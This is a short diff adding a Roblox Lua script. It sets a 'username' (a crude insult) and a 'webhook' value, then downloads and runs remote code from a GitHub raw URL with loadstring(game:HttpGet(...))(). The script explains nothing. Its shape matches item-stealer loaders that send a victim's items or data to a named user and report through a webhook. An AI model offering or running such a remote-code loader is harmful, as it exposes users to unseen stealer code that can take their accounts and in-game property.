@@ -1,0 +1,4 @@
+username = "dolbaeb"
+webhook = "lalala" 
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/RedX/refs/heads/main/IStock2025',true))()
